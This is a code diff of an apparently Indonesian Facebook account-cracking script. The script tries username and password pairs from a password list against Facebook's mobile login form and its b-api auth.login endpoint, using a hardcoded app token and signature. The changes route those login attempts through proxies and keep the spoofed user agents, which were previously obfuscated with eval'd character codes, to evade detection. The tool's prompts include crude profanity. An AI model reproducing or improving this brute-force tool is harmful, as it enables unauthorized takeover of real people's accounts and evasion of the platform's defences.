@@ -2,11 +2,16 @@
 
 from modul import *
 from .useragent import *
+from .proxylistt import *
 from .list_pass import pw_list
 from datetime import datetime
 import concurrent.futures
 import urllib.request
 import random
+
+if os.path.exists("saya_gans/ngewe/.useragent"):
+	if os.path.getsize("saya_gans/ngewe/.useragent")!=0:
+		ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg=open("saya_gans/ngewe/.useragent").read().strip()
 
 ok,cp,cout,live,chek,kumpul,lahir=0,0,0,[],[],[],""
 
@@ -60,8 +65,8 @@ class crack:
 			else:
 				data.update({INPUT["name"]:INPUT["value"]})
 		data.update({"email":username,"pass":password})
-		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
-		ses.post(url+action,data=data,allow_redirects=False)
+		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
+		ses.post(url+action,data=data,proxies=dict(http=proxsi),allow_redirects=False)
 		return ses.cookies.get_dict()
 	
 	def fckyu(self,username,password,url,**data):
@@ -87,9 +92,9 @@ class crack:
 	
 	def bapi(self,username,password):
 		ses=req.session()
-		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni":str(random.randint(20000, 40000)),"x-fb-net-hni":str(random.randint(20000, 40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
+		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni":str(random.randint(20000, 40000)),"x-fb-net-hni":str(random.randint(20000, 40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
 		ses.params.update({"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
-		return ses.get("https://b-api.facebook.com/method/auth.login").json()
+		return ses.get("https://b-api.facebook.com/method/auth.login",proxies=dict(http=proxsi)).json()
 	
 	def awokawok_ngentod(self,manual=None):
 		pilih=input(" ? pilih : ")
@@ -216,5 +221,6 @@ class crack:
 			if n in tuple("tT"):
 				return False
 			else:
-				print(" ! isi yang bener ngentod");self.awikwok()
+				print(" ! isi yang bener ngentod")
+				return self.awikwok()
 			
